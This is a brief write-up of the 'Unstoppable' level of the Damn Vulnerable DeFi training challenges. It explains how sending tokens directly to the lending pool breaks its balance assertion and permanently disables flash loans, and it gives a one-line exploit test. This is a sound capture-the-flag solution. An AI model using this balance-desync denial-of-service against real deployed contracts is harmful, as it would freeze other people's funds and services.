# DamnVulnerableDefi

## 1. Unstoppable 

To stop the pool from offering flash loans the assert statement in the flashloan function needs to be exploited. This can be done via sending
tokens to the contract by not using the depositTOken function. This way ```poolBlanace``` will never be equal to ```balanceBefore```.

Add these lines to unstopabble.challenge.js:
```
 it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });
```
